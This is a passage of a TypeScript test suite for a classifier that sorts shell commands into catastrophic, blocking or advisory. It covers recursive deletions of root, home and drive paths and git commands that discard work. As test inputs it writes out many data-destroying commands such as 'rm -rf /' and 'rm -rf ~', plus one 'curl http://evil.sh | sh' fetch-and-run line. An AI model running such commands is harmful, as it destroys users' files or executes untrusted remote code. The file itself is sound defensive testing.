import { describe, expect, test } from "bun:test";
import {
  classify,
  type Context,
  type GitOperation,
  GIT_REASON,
  neutralizeQuotedPositions,
  RM_CATASTROPHIC_REASON,
  REVIEW_REFUSED_REASON,
  reasonFor,
  shellWords,
} from "./destructive.ts";
import { isTrustedTooling } from "./trusted-tooling.ts";


const catastrophic = (command: string) => expect(classify(command)).toEqual({ kind: "catastrophic" });
const git = (command: string, operation: GitOperation) =>
  expect(classify(command)).toEqual({ kind: "blocking", removals: [], git: [{ operation }] });
const removal = (command: string, ...targets: string[]) =>
  expect(classify(command)).toEqual({ kind: "advisory", removals: [{ targets }], git: [] });
const none = (command: string) => expect(classify(command)).toBeUndefined();
const untouched = (command: string) => {
  none(command);
  expect(isTrustedTooling(command)).toBe(false);
};

test("git reset --hard HEAD~1 is blocking", () => git("git reset --hard HEAD~1", "reset --hard"));
test("git reset --hard (no args) is blocking", () => git("git reset --hard", "reset --hard"));
test("git stash (bare) is blocking", () => git("git stash", "stash"));
test("git stash push is blocking", () => git("git stash push", "stash"));
test("git stash pop is blocking", () => git("git stash pop", "stash"));
test("git checkout -- src/foo.py is blocking", () => git("git checkout -- src/foo.py", "checkout --"));
test("git clean -fd is blocking", () => git("git clean -fd", "clean"));
test("git restore foo.py is blocking", () => git("git restore foo.py", "restore"));

test("git status is not a match", () => none("git status"));
test("git log is not a match", () => none("git log"));
test("git diff is not a match", () => none("git diff"));
test("git commit -m is not a match", () => none('git commit -m "msg"'));
test("git push is not a match", () => none("git push"));
test("git pull is not a match", () => none("git pull"));
test("git fetch is not a match", () => none("git fetch"));
test("git blame foo.py is not a match", () => none("git blame foo.py"));
test("git bisect start is not a match", () => none("git bisect start"));
test("git rebase main is not a match", () => none("git rebase main"));

test("git stash followed by a semicolon is blocking", () => git("git stash; echo ok", "stash"));
test("git stash backgrounded is blocking", () => git("git stash&", "stash"));
test("git stash piped is blocking", () => git("git stash|cat", "stash"));
test("git stash inside a substitution is blocking", () => git("echo $(git stash)", "stash"));
test("git clean redirected is blocking", () => git("git clean >/tmp/out", "clean"));
test("sudo git clean -fdx is blocking", () => git("sudo git clean -fdx", "clean"));
test("sudo git reset --hard is blocking", () => git("sudo git reset --hard", "reset --hard"));

test("git cleanup is not a match", () => none("git cleanup"));
test("git stashy is not a match", () => none("git stashy"));
test("git checkout --detach is not a match", () => none("git checkout --detach"));
test("git checkout --track origin/x is not a match", () => none("git checkout --track origin/x"));
test("git checkout -- . is still blocking", () => git("git checkout -- .", "checkout --"));

test("checkout of a revision followed by -- is blocking", () =>
  git("git checkout HEAD -- .", "checkout --"));
test("a -C redirected reset --hard is blocking", () => git("git -C /repo reset --hard", "reset --hard"));
test("a --git-dir redirected reset --hard is blocking", () =>
  git("git --git-dir=/repo/.git reset --hard", "reset --hard"));
test("a -c config-override reset --hard is blocking", () =>
  git("git -c user.name=x reset --hard", "reset --hard"));
test("git rm of a tree is blocking", () => git("git rm -rf .", "rm -r"));
test("a quoted subcommand is blocking", () => git('git "reset" --hard', "reset --hard"));

test("a commit message naming the subcommand in parens is not a match", () =>
  none('git commit -m "restore state (git stash used)"'));
test("a read-only log pickaxe search in parens is not a match", () =>
  none('git log --oneline -S "(git restore)"'));
test("a chained checkout with a later -- token is not a match", () =>
  none("git checkout main && echo -- x"));

test("git rm --cached is not a match", () => none("git rm --cached secrets.env"));
test("git rm of a single file is not a match", () => none("git rm stale.txt"));
test("git rm -r of a directory is blocking", () => git("git rm -r vendor/", "rm -r"));
test("a space-separated --git-dir reset --hard is blocking", () =>
  git("git --git-dir /r/.git reset --hard", "reset --hard"));
test("a space-separated --work-tree reset --hard is blocking", () =>
  git("git --work-tree /w reset --hard", "reset --hard"));
test("a --no-pager reset --hard is blocking", () => git("git --no-pager reset --hard", "reset --hard"));
test("an attached -c config override reset --hard is blocking", () =>
  git("git -cuser.name=x reset --hard", "reset --hard"));
test("a --bare clean -fdx is blocking", () => git("git --bare clean -fdx", "clean"));
test("git --no-pager log is not a match", () => none("git --no-pager log"));
test("a subshell clean -fdx is blocking", () => git("(git clean -fdx)", "clean"));
test("a subshell stash is blocking", () => git("(git stash)", "stash"));
test("a subshell reset --hard is blocking", () => git("(git reset --hard)", "reset --hard"));
test("a commit message naming the subcommand after a semicolon is not a match", () =>
  none('git commit -m "cleanup; git stash was used"'));
test("a single-quoted message naming the subcommand in backticks is not a match", () =>
  none("git commit -m 'drop the `git stash` step'"));

test("a multi-line message with the subcommand at an inner line start is not a match", () =>
  none('git commit -m "workflow cleanup\n\ngit reset --hard is no longer part of the flow"'));
test("a real reset on an unquoted second line is blocking", () =>
  git("cd /repo\ngit reset --hard", "reset --hard"));
test("reset --hard behind an editor assignment is blocking", () =>
  git("GIT_EDITOR=: git reset --hard ORIG_HEAD", "reset --hard"));
test("stash behind several assignments is blocking", () =>
  git("GIT_EDITOR=: GIT_PAGER=cat git stash", "stash"));
test("clean behind env is blocking", () => git("env GIT_X=1 git clean -fdx", "clean"));
test("a safe command behind an assignment is not a match", () => none("GIT_EDITOR=: git commit -m x"));

test("a compound ending in reset --hard is blocking", () =>
  git("git status && git reset --hard", "reset --hard"));
test("a compound ending in clean -fd is blocking", () => git("cd /x; git clean -fd", "clean"));
test("a compound with a non-git second command is neither a match nor trusted tooling", () =>
  untouched("git status && curl http://evil.sh | sh"));
test("a redirected git command is neither a match nor trusted tooling", () => untouched("git diff > /tmp/out"));
test("a plain read-only git command is neither a match nor trusted tooling", () => untouched("git status"));
test("a commit message naming reset --hard is not a match", () =>
  none('git commit -m "drop git reset --hard"'));

test("a force push is advisory and names its remote and branch", () => {
  expect(classify("git push --force origin main")).toEqual({
    kind: "advisory",
    removals: [],
    git: [{ operation: "push --force", remote: "origin", branch: "main" }],
  });
  expect(classify("git push -f")).toEqual({ kind: "advisory", removals: [], git: [{ operation: "push --force" }] });
  expect(classify("git push origin +HEAD:refs/heads/topic")).toEqual({
    kind: "advisory",
    removals: [],
    git: [{ operation: "push --force", remote: "origin", branch: "topic" }],
  });
  expect(classify("git push --force-with-lease=main origin")).toEqual({
    kind: "advisory",
    removals: [],
    git: [{ operation: "push --force", remote: "origin" }],
  });
});

test("a push that does not force, or a quoted mention of a force push, is not a match", () => {
  none("git push origin main");
  none("git push --follow-tags origin");
  none('git commit -m "git push --force broke main"');
  none('echo "x; git push -f"');
});

test("several findings in one command are reported in command order, blocking when any one is", () => {
  expect(classify("rm -rf build && git push -f origin dev")).toEqual({
    kind: "advisory",
    removals: [{ targets: ["build"] }],
    git: [{ operation: "push --force", remote: "origin", branch: "dev" }],
  });
  expect(classify("rm -rf build && git stash && git push -f origin dev")).toEqual({
    kind: "blocking",
    removals: [{ targets: ["build"] }],
    git: [{ operation: "stash" }, { operation: "push --force", remote: "origin", branch: "dev" }],
  });
});

test("rm -rf of the root is catastrophic", () => catastrophic("rm -rf /"));
test("rm -Rf is catastrophic (uppercase flag)", () => catastrophic("rm -Rf ~"));
test("rm -R is catastrophic (uppercase, no force)", () => catastrophic("rm -R ~"));
test("rm -f -r is catastrophic (split flags)", () => catastrophic("rm -f -r ~"));
test("rm -v -rf is catastrophic (recursive flag not first)", () => catastrophic("rm -v -rf ~"));
test("sudo rm -f -r / is catastrophic", () => catastrophic("sudo rm -f -r /"));
test("rm --recursive is catastrophic (long form)", () => catastrophic("rm --recursive ~"));
test("rm -f of a single file is not a match", () => none("rm -f /tmp/one.txt"));
test("rm --force of a single file is not a match", () => none("rm --force /tmp/one.txt"));
test("an unknown command is neither a match nor trusted tooling", () => untouched("python3 script.py"));
test("sudo rm -rf of the root is catastrophic", () => catastrophic("sudo rm -rf /"));

test("&& compound ending in rm -rf of a home path is catastrophic", () => catastrophic("cd /x && rm -rf ~/y"));
test("&& compound ending in sudo rm -rf of root is catastrophic", () =>
  catastrophic("echo hi && sudo rm -rf /"));
test("semicolon compound ending in rm -rf is catastrophic", () => catastrophic("cd /x; rm -rf /usr"));
test("newline-separated rm -rf is catastrophic", () => catastrophic("cd /x\nrm -rf ~/y"));
test("rm -rf with a dollar-paren substitution target is catastrophic", () => catastrophic("rm -rf $(echo ~)"));
test("rm -rf with a backquote substitution target is catastrophic", () => catastrophic("rm -rf `echo ~`"));
test("rm -rf inside a substitution is catastrophic", () => catastrophic("echo $(rm -rf ~/y)"));
test("leading-whitespace rm -rf is catastrophic", () => catastrophic("   rm -rf /"));
test("grep for the text of an rm -rf command is not a match", () => none('grep -rn "rm -rf" scripts/'));
test("single-quoted grep for the text of an rm -rf command is not a match", () =>
  none("grep -rn 'rm -rf' ."));

test("grep whose pattern is the text of an rm -rf is not a match", () =>
  none('grep -rn "rm -rf /" scripts/'));
test("a commit message naming rm -rf is not a match", () =>
  none('git commit -m "stop using rm -rf"'));
test("rm with no recursive flag is not a match", () => none("rm -f stale.lock"));
test("rmdir is not a match", () => none("rmdir /tmp/emptydir"));
test("a read-only command is not a match", () => none("ls -la /home/u"));

test("a recursive rm of a nested temp path is held for review with its target", () =>
  removal("rm -rf /tmp/omca-canary", "/tmp/omca-canary"));
test("a loop cleaning a pid-suffixed scratch dir is held for review, not denied", () =>
  removal(
    'for d in a b; do mkdir -p /tmp/x$$; dpkg-deb -x $d/p.deb /tmp/x$$; md5sum $(find /tmp/x$$ -name "*.so"); rm -rf /tmp/x$$; done',
    "/tmp/x$$",
  ));
test("a recursive rm of a relative build dir lists both targets for review", () =>
  removal("cd /x && rm -rf build dist/out", "build", "dist/out"));
test("a recursive rm two levels under home is held for review", () => removal("rm -rf ~/.cache/foo", "~/.cache/foo"));
test("a deeper variable-led path is held for review", () => removal("rm -rf $DIR/build/out", "$DIR/build/out"));
test("a quoted target with a space is one target", () => removal('rm -rf "my build" -- -odd', "my build", "-odd"));

test("a directory directly under root is catastrophic", () => catastrophic("rm -rf /usr/*"));
test("a directory directly under home is catastrophic", () => catastrophic("rm -rf $HOME/dev"));
test("a glob of the working directory is catastrophic", () => catastrophic("rm -rf ./*"));
test("a parent-directory target is catastrophic", () => catastrophic("rm -rf a/../.."));
test("a variable-led path that is root-level when empty is catastrophic", () => catastrophic("rm -rf $DIR/*"));
test("--no-preserve-root is catastrophic whatever the target", () =>
  catastrophic("rm -rf --no-preserve-root /tmp/a/b"));
test("a safe removal does not mask a later catastrophic one", () =>
  catastrophic("rm -rf /tmp/a/b; rm -rf ~"));

test("a multi-line message with a recursive removal at an inner line start is not a match", () =>
  none('git commit -m "refactor hooks\n\nrm -rf calls were replaced by explicit deletes"'));
test("a multi-line message with a recursive removal mid-line is not a match", () =>
  none('git commit -m "refactor hooks\n\nwe dropped the rm -rf call here"'));
test("a real recursive removal on an unquoted second line is still catastrophic", () =>
  catastrophic("cd /tmp\nrm -rf *"));
test("a real recursive removal after && is still catastrophic", () => catastrophic("git status && rm -rf .."));

test("rm -rf behind a variable assignment is catastrophic", () => catastrophic("FOO=1 rm -rf /"));
test("rm -rf behind a quoted assignment is catastrophic", () => catastrophic('X="a b" rm -rf ~'));
test("rm -rf behind env is catastrophic", () => catastrophic("env FOO=1 rm -rf ."));
test("an rm mention after a non-assignment word is not a removal", () => none("echo FOO=1 rm -rf x"));

test("rm -rf of home is catastrophic", () => catastrophic("rm -rf ~"));
test("the catastrophic reason names the destructive rm -rf", () => {
  const finding = classify("rm -rf ~");
  expect(finding === undefined ? "" : reasonFor(finding)).toStartWith("Destructive rm -rf blocked:");
});
test("rm -r of a directory under the root is catastrophic", () => catastrophic("rm -r /opt"));
test("sudo rm -rf of a directory under the root is catastrophic", () => catastrophic("sudo rm -rf /var"));
test("an inline rmdir is neither a match nor trusted tooling", () => untouched("rmdir foo"));
test("sudo apt-get install is neither a match nor trusted tooling", () =>
  untouched("sudo apt-get install build-essential"));

test("catastrophic and blocking carry their deny reasons, advisory a refusal", () => {
  expect(reasonFor({ kind: "catastrophic" })).toBe(RM_CATASTROPHIC_REASON);
  expect(reasonFor({ kind: "blocking", removals: [{ targets: [] }], git: [{ operation: "stash" }] })).toBe(GIT_REASON);
  expect(reasonFor({ kind: "advisory", removals: [{ targets: [] }], git: [] })).toBe(REVIEW_REFUSED_REASON);
});

test("quoted command-position characters are blanked without changing the length", () => {
  const command = `echo "a; b | (c)" 'd $(e) \`f\`' g; h`;
  expect(neutralizeQuotedPositions(command)).toBe(`echo "a_ b _ _c_" 'd __e_ _f_' g; h`);
  expect(neutralizeQuotedPositions(command)).toHaveLength(command.length);
});

test("shell words drop quotes and keep a quoted space inside its word", () => {
  expect(shellWords(` a "b c" 'd'e "" `)).toEqual(["a", "b c", "de", ""]);
});

const bashIn = (ctx: Omit<Context, "shell">): Context => ({ shell: "bash", ...ctx });
const POSIX_SESSION = bashIn({ home: "/home/bob", cwd: "/home/bob/proj/sub", root: "/home/bob/proj" });
const MAC_SESSION = bashIn({ home: "/Users/bob", cwd: "/Users/bob/proj" });
const WINDOWS_SESSION = bashIn({ home: "C:\\Users\\x", cwd: "C:\\Users\\x\\proj", root: "C:\\Users\\x\\proj" });

const classOf = (command: string, ctx?: Context) => classify(command, ctx)?.kind ?? "none";

describe("drive, mount and share roots", () => {
  test.each([
    ["rm -rf C:", "catastrophic"],
    ["rm -rf C:\\", "catastrophic"],
    ["rm -rf C:/", "catastrophic"],
    ["rm -rf c:/", "catastrophic"],
    ["rm -rf C:\\*", "catastrophic"],
    ["rm -rf C:\\Windows", "catastrophic"],
    ["rm -rf C:\\Windows\\*", "catastrophic"],
    ["rm -rf C:\\Windows\\System32", "advisory"],
    ["rm -rf /c", "catastrophic"],
    ["rm -rf /mnt/c", "catastrophic"],
    ["rm -rf /mnt/c/Users/bob/build", "advisory"],
    ["rm -rf /mnt/data", "advisory"],
    ["rm -rf /c/Users", "advisory"],
    ["rm -rf /d/build", "advisory"],
    ["rm -rf /cygdrive/c/Users", "advisory"],
    ["rm -rf /Volumes/Backup/Users", "advisory"],
    ["rm -rf \\\\srv\\share", "catastrophic"],
    ["rm -rf //srv/share", "catastrophic"],
    ["rm -rf //srv/share/*", "catastrophic"],
    ["rm -rf //srv/share/builds", "advisory"],
  ])("on Linux, %s is %s", (command, expected) => expect(classOf(command)).toBe(expected));

  test.each([
    ["rm -rf /c", "catastrophic"],
    ["rm -rf /c/", "catastrophic"],
    ["rm -rf /c/Windows", "catastrophic"],
    ["rm -rf /c/Windows/*", "catastrophic"],
    ["rm -rf /c/Windows/System32", "advisory"],
    ["rm -rf /d/build", "catastrophic"],
    ["rm -rf /d/build/out", "advisory"],
    ["rm -rf /cygdrive/c", "catastrophic"],
    ["rm -rf /cygdrive/c/Windows", "catastrophic"],
    ["rm -rf /mnt/c/Windows", "catastrophic"],
  ])("on Windows, %s is %s", (command, expected) => expect(classOf(command, WINDOWS_SESSION)).toBe(expected));

  test.each([
    ["rm -rf /Volumes/Macintosh\\ HD/", "catastrophic"],
    ["rm -rf '/Volumes/Macintosh HD'", "catastrophic"],
    ["rm -rf /Volumes/Backup/Users", "catastrophic"],
    ["rm -rf /Volumes/Backup/photos/2024", "advisory"],
    ["rm -rf /mnt/c/Users", "advisory"],
  ])("on macOS, %s is %s", (command, expected) => expect(classOf(command, MAC_SESSION)).toBe(expected));

  test("a drive root named in a mention is not a removal", () => {
    none('echo "rm -rf C:\\"');
    none('git commit -m "never rm -rf /c/Users"');
    none("rm -f C:\\one.txt");
  });
});

describe("home variables", () => {
  test.each([
    "$USERPROFILE",
    "${USERPROFILE}",
    "$env:USERPROFILE",
    "%USERPROFILE%",
    "$HOMEDRIVE$HOMEPATH",
    "${HOMEDRIVE}${HOMEPATH}",
    "$env:HOMEDRIVE$env:HOMEPATH",
  ])("rm -rf %s is catastrophic alone and with a glob under it", (home) => {
    expect(classOf(`rm -rf ${home}`)).toBe("catastrophic");
    expect(classOf(`rm -rf "${home}"`)).toBe("catastrophic");
    expect(classOf(`rm -rf ${home}/*`)).toBe("catastrophic");
    expect(classOf(`rm -rf ${home}\\*`)).toBe("catastrophic");
    expect(classOf(`rm -rf ${home}/dev`)).toBe("catastrophic");
    expect(classOf(`rm -rf ${home}/dev/build`)).toBe("advisory");
  });

  test("a home variable followed by a suffix is not home", () => {
    expect(classOf("rm -rf $USERPROFILE.bak")).toBe("advisory");
  });
});

describe("a variable that is always set", () => {
  test.each([
    'rm -rf "$TMPDIR/foo"',
    "rm -rf ${TMPDIR}/foo",
    "rm -rf $TEMP/x",
    "rm -rf $TMP/x/y",
    "rm -rf $RUNNER_TEMP/build",
    "rm -rf $XDG_CACHE_HOME/omca",
    "rm -rf ${XDG_DATA_HOME}/a/b",
    "rm -rf $env:TEMP\\x",
    "rm -rf %TEMP%\\x",
    "rm -rf $TMPDIR/*",
  ])("%s is held for review, not denied", (command) => expect(classOf(command)).toBe("advisory"));

  test.each([
    "rm -rf $DIR/*",
    "rm -rf $DIR/build",
    "rm -rf $TMPDIR_X/foo",
    "rm -rf $TMPDIR/../..",
    "rm -rf ${XDG_CACHE_HOME}/../*",
    "rm -rf $env:LOCALAPPDATA\\*",
  ])("%s still reads as a root when the variable is empty, so it is catastrophic", (command) =>
    expect(classOf(command)).toBe("catastrophic"));

  test.each([
    ["rm -rf $LOCALAPPDATA", "catastrophic"],
    ["rm -rf $APPDATA/*", "catastrophic"],
    ["rm -rf %LOCALAPPDATA%\\..\\..", "catastrophic"],
    ["rm -rf $LOCALAPPDATA/npm-cache", "advisory"],
    ["rm -rf %APPDATA%\\Code\\Cache", "advisory"],
  ])("a per-user data folder or all its contents is a loss, a folder inside it is not: %s is %s", (command, expected) =>
    expect(classOf(command)).toBe(expected));

  test("a variable alone or with a dotted suffix is held for review", () => {
    expect(classOf("rm -rf $TMPDIR")).toBe("advisory");
    expect(classOf("rm -rf $DIR")).toBe("advisory");
  });
});

describe("home, the working directory and its parents in any spelling", () => {
  test.each([
    ["rm -rf /home/bob", "catastrophic"],
    ["rm -rf /home/bob/", "catastrophic"],
    ["rm -rf /home/bob/*", "catastrophic"],
    ["rm -rf /home/bob/dev", "catastrophic"],
    ["rm -rf /home/bob/dev/x", "advisory"],
    ["rm -rf /home/bob/proj", "catastrophic"],
    ["rm -rf /home/bob/proj/sub", "catastrophic"],
    ["rm -rf /home/bob/proj/sub/*", "catastrophic"],
    ["rm -rf /home/bob/proj/other/../sub", "catastrophic"],
    ["rm -rf /home/bob/proj/./sub/", "catastrophic"],
    ["rm -rf /home/bob/proj/sub/build", "advisory"],
    ["rm -rf /home/bob/proj/docs", "advisory"],
    ["rm -rf /home/bob/proj/../..", "catastrophic"],
    ["rm -rf /home/bobby", "advisory"],
    ["rm -rf /HOME/BOB/dev", "advisory"],
    ["rm -rf /tmp/work", "advisory"],
  ])("on posix, %s is %s", (command, expected) => expect(classOf(command, POSIX_SESSION)).toBe(expected));

  test.each([
    ["rm -rf /Users/bob/*", "catastrophic"],
    ["rm -rf /users/BOB", "catastrophic"],
    ["rm -rf /Users/Bob/Documents", "catastrophic"],
    ["rm -rf /Users/bob/Library/Caches", "advisory"],
    ["rm -rf /Users/bobby", "advisory"],
  ])("on macOS, %s is %s", (command, expected) => expect(classOf(command, MAC_SESSION)).toBe(expected));

  test.each([
    ["rm -rf C:\\Users\\x", "catastrophic"],
    ["rm -rf C:\\Users\\x\\*", "catastrophic"],
    ["rm -rf c:/users/X/", "catastrophic"],
    ["rm -rf /c/Users/x", "catastrophic"],
    ["rm -rf C:\\Users\\x\\proj", "catastrophic"],
    ["rm -rf C:\\Users\\x\\Documents", "catastrophic"],
    ["rm -rf C:\\Users\\x\\proj\\build", "advisory"],
    ["rm -rf C:\\Users\\x\\Documents\\old", "advisory"],
    ["rm -rf C:\\Users\\xavier", "advisory"],
  ])("on Windows, %s is %s", (command, expected) => expect(classOf(command, WINDOWS_SESSION)).toBe(expected));

  test("with no session known, an absolute home spelling stays held for review", () => {
    expect(classOf("rm -rf /home/bob")).toBe("advisory");
    expect(classOf("rm -rf /Users/bob/*")).toBe("advisory");
    expect(classOf("rm -rf C:\\Users\\x")).toBe("advisory");
  });

  test("an explicit platform decides case folding", () => {
    expect(classOf("rm -rf /HOME/BOB", { shell: "bash", home: "/home/bob", platform: "win32" })).toBe("catastrophic");
    expect(classOf("rm -rf /HOME/BOB", { shell: "bash", home: "/home/bob", platform: "linux" })).toBe("advisory");
  });
});

describe("command words", () => {
  test.each([
    ["git.exe reset --hard", "reset --hard"],
    ["/usr/bin/git reset --hard", "reset --hard"],
    ["/mingw64/bin/git stash", "stash"],
    ['"C:\\Program Files\\Git\\cmd\\git.exe" reset --hard', "reset --hard"],
    ["'/c/Program Files/Git/cmd/git.exe' clean -fd", "clean"],
    ["/c/Program\\ Files/Git/cmd/git restore x", "restore"],
    ['git -C "C:\\My Repo" reset --hard', "reset --hard"],
    ["git -C 'C:\\My Repo' stash", "stash"],
    ['git --git-dir="C:\\My Repo\\.git" reset --hard', "reset --hard"],
    ["git --git-dir '/my repo/.git' clean -fdx", "clean"],
    ['git --work-tree "/my repo" restore .', "restore"],
    ["git -C /my\\ repo reset --hard", "reset --hard"],
    ['FOO=1 "/usr/bin/git" reset --hard', "reset --hard"],
  ] as const)("%s is blocking", (command, operation) => git(command, operation));

  test.each([
    "rm.exe -rf /",
    "/usr/bin/rm -rf /",
    "command rm -rf /",
    "command -p rm -rf /",
    "\\rm -rf /",
    '"/usr/bin/rm" -rf /',
    "sudo /bin/rm -rf ~",
    "RM_X=1 rm.exe -rf $HOME",
  ])("%s is catastrophic", (command) => catastrophic(command));

  test("a path-prefixed rm names its targets for review", () => {
    removal("/usr/bin/rm -rf build", "build");
    removal("rm.exe -rf 'my build'", "my build");
    removal("rm -rf my\\ build", "my build");
  });

  test("git.exe and a path-prefixed git that do not discard work are not a match", () => {
    none("git.exe status");
    none("/usr/bin/git log --oneline");
    none('"C:\\Program Files\\Git\\cmd\\git.exe" diff');
    none('git -C "C:\\My Repo" status');
  });

  test("a mention of a path-prefixed command is not a match", () => {
    none('echo "/usr/bin/rm -rf /"');
    none('grep -rn "git.exe reset --hard" docs/');
    none("ls /usr/bin/rm /usr/bin/git");
    none('git commit -m "document /usr/bin/git reset --hard"');
    none("cat /usr/bin/rm -rf");
    none("rm.exe -f stale.lock");
    none("xrm -rf /");
    none("git.exec reset --hard");
  });
});

describe("heredoc bodies", () => {
  test("the body of a quoted heredoc is text, not commands", () => {
    none("cat <<'EOF'\nrm -rf /\nEOF");
    none("cat <<'EOF' > notes.md\ngit reset --hard\nrm -rf ~\ngit push --force\nEOF");
    none('cat <<"EOF"\nrm -rf /\nEOF');
    none("cat <<\\EOF\nrm -rf /\nEOF");
    none("cat <<-'EOF'\n\trm -rf /\n\tEOF");
    none("git commit -F - <<'MSG'\nfix: stop running git reset --hard\n\nrm -rf / is gone\nMSG");
    none("cat <<'A' <<'B'\nrm -rf /\nA\ngit stash\nB");
  });

  test("a command after the terminator, or on the heredoc line, still runs", () => {
    catastrophic("cat <<'EOF'\nnotes\nEOF\nrm -rf /");
    git("cat <<'EOF' > f\nnotes\nEOF\ngit reset --hard", "reset --hard");
    catastrophic("rm -rf / <<'EOF'\nnotes\nEOF");
    catastrophic("cat <<'A' <<'B'\nx\nA\ny\nB\nrm -rf ~");
    catastrophic("cat <<'EOF'\nEOF\nrm -rf /");
  });

  test("an unquoted heredoc still runs its substitutions, and a here-string hides nothing", () => {
    catastrophic("cat <<EOF\n$(rm -rf ~)\nEOF");
    catastrophic("cat <<<'EOF'\nrm -rf /");
    catastrophic("echo $((1 << 2))\nrm -rf /");
  });

  test("an unterminated quoted heredoc hides the rest, as the shell reads it", () => {
    none("cat <<'EOF'\nrm -rf /");
  });

  test("a heredoc keeps the length of the command", () => {
    const command = "cat <<'EOF'\nrm -rf /; x\nEOF\nls";
    expect(neutralizeQuotedPositions(command)).toBe("cat <<'EOF'\n___________\nEOF\nls");
    expect(neutralizeQuotedPositions(command)).toHaveLength(command.length);
  });

  test("a heredoc delimiter inside a quoted span opens no heredoc", () => {
    catastrophic("echo \"<<'EOF'\"\nrm -rf /");
  });
});

describe("a substitution inside double quotes", () => {
  test.each([
    'echo "$(rm -rf ~)"',
    '"$(rm -rf ~)"',
    'echo "before $(rm -rf /) after"',
    'echo "`rm -rf ~`"',
    'echo "$(echo "$(rm -rf ~)")"',
    'echo "$(echo ok; rm -rf ~)"',
    'A="$(rm -rf ~)" true',
    'echo "$((1 + 2))" && rm -rf ~',
    'rm -rf "$(echo ~)"',
    'rm -rf "$(pwd)/$(date)"',
    'rm -rf "$(dirname "$PWD")"',
    'rm -rf "`echo ~`"',
  ])("%s is catastrophic", (command) => catastrophic(command));

  test.each([
    ['echo "$(git stash)"', "stash"],
    ['echo "`git reset --hard`"', "reset --hard"],
    ['git commit -m "$(git clean -fd)"', "clean"],
  ] as const)("%s is blocking", (command, operation) => git(command, operation));

  test("a removal that is only a mention beside a substitution is not a match", () => {
    none("echo '$(rm -rf ~)'");
    none("echo '`rm -rf ~`'");
    none('echo "\\$(rm -rf ~)"');
    none('echo "\\`rm -rf ~\\`"');
    none('echo "\\\\\\$(rm -rf ~)"');
    none('echo "$(date)" "; rm -rf ~"');
    none('echo "$(date)" "rm -rf ~"');
    none('echo "$((1 + 2))" "(rm -rf ~)"');
    none('echo "$(echo "x")" "; git stash"');
    none('git commit -m "fix $(date): stop calling rm -rf ~"');
    none('echo "$(echo "a; rm -rf ~")"');
  });

  test("a substitution that runs something harmless is not a match", () => {
    none('echo "$(date)"');
    none('echo "`date`"');
    none('git commit -m "release $(git describe --tags)"');
  });

  test("an escaped backslash does not escape the substitution after it", () => {
    catastrophic('echo "\\\\$(rm -rf ~)"');
  });

  test("the neutralized text leaves a substitution as a command and keeps the length", () => {
    const command = `echo "$(a; b) (c) \`d; e\`" '$(f)'`;
    expect(neutralizeQuotedPositions(command)).toBe(`echo "$(a; b) _c_ \`d; e\`" '__f_'`);
    expect(neutralizeQuotedPositions(command)).toHaveLength(command.length);
    expect(neutralizeQuotedPositions('"\\$(x)"')).toBe('"\\__x_"');
  });
});

describe("a relative target", () => {
  test.each([
    ["rm -rf ..", "catastrophic"],
    ["rm -rf ../sub", "catastrophic"],
    ["rm -rf ../sub/", "catastrophic"],
    ["rm -rf ../../proj", "catastrophic"],
    ["rm -rf ../../proj/*", "catastrophic"],
    ["rm -rf ../../proj/sub/..", "catastrophic"],
    ["rm -rf ./*", "catastrophic"],
    ["rm -rf ./build", "advisory"],
    ["rm -rf build/out", "advisory"],
    ["rm -rf ./sub", "advisory"],
    ["rm -rf build/*", "advisory"],
    ["rm -rf ../other", "advisory"],
  ])("from the project's subdirectory, %s is %s", (command, expected) =>
    expect(classOf(command, POSIX_SESSION)).toBe(expected));

  test("a relative path below the working directory is never catastrophic, however shallow the directory", () => {
    expect(classOf("rm -rf build", bashIn({ home: "/home/bob", cwd: "/home/bob" }))).toBe("advisory");
    expect(classOf("rm -rf lib", bashIn({ home: "/home/bob", cwd: "/usr" }))).toBe("advisory");
    expect(classOf("rm -rf ../lib", bashIn({ home: "/home/bob", cwd: "/usr/bin" }))).toBe("advisory");
  });

  test("with no working directory known, a relative path keeps the reading it had", () => {
    expect(classOf("rm -rf ../sub")).toBe("advisory");
    expect(classOf("rm -rf ../sub", bashIn({ home: "/home/bob" }))).toBe("advisory");
    expect(classOf("rm -rf ../sub", bashIn({ cwd: "proj/sub" }))).toBe("advisory");
    expect(classOf("rm -rf ..")).toBe("catastrophic");
  });

  test("on Windows a relative path is resolved against the working directory too", () => {
    const session = bashIn({ home: "C:\\Users\\x", cwd: "C:\\Users\\x\\proj\\sub", root: "C:\\Users\\x\\proj" });
    expect(classOf("rm -rf ..\\sub", session)).toBe("catastrophic");
    expect(classOf("rm -rf ..\\..", session)).toBe("catastrophic");
    expect(classOf("rm -rf ..\\build", session)).toBe("advisory");
    expect(classOf("rm -rf .\\build", session)).toBe("advisory");
  });
});

describe("the working directory named as a variable or a substitution", () => {
  const SESSION = bashIn({ home: "/home/bob", cwd: "/home/bob/proj/sub", root: "/home/bob/proj" });
  const NO_CWD = bashIn({ home: "/home/bob" });

  test.each([
    'rm -rf "$(pwd)/build"',
    "rm -rf $(pwd)/build",
    'rm -rf "`pwd`/build"',
    "rm -rf `pwd`/build/out",
    'rm -rf "$PWD/build"',
    "rm -rf $PWD/build",
    "rm -rf ${PWD}/build",
    'rm -rf "${PWD}/build"',
    "rm -rf $PWD/build/*",
    "rm -rf $(pwd)/build $PWD/dist",
    'echo "$(rm -rf "$PWD/build")"',
    "echo $(rm -rf $(pwd)/build) done",
    "cd x && rm -rf $PWD/build; echo ok",
  ])("%s is held for review whether or not the working directory is known", (command) => {
    expect(classOf(command, SESSION)).toBe("advisory");
    expect(classOf(command, NO_CWD)).toBe("advisory");
    expect(classOf(command)).toBe("advisory");
  });

  test.each([
    'rm -rf "$PWD"',
    "rm -rf $PWD",
    "rm -rf ${PWD}",
    "rm -rf $(pwd)",
    'rm -rf "$(pwd)"',
    "rm -rf `pwd`",
    "rm -rf $(pwd)/..",
    'rm -rf "$PWD/.."',
    "rm -rf $PWD/*",
    "rm -rf $(pwd)/*",
    "rm -rf ${PWD}/../..",
    "rm -rf $PWD/.",
  ])("%s is the working directory or a parent, so it is catastrophic", (command) => {
    expect(classOf(command, SESSION)).toBe("catastrophic");
    expect(classOf(command, NO_CWD)).toBe("catastrophic");
    expect(classOf(command)).toBe("catastrophic");
  });

  test("a sibling of the working directory is judged as the path it names when the directory is known", () => {
    expect(classOf("rm -rf $PWD/../other", SESSION)).toBe("advisory");
    expect(classOf("rm -rf $PWD/../../x", SESSION)).toBe("catastrophic");
    expect(classOf("rm -rf $PWD/../other", NO_CWD)).toBe("advisory");
  });

  test("a variable that only starts with PWD, or another substitution in the target, is still unknown", () => {
    expect(classOf("rm -rf $PWDX/build", SESSION)).toBe("catastrophic");
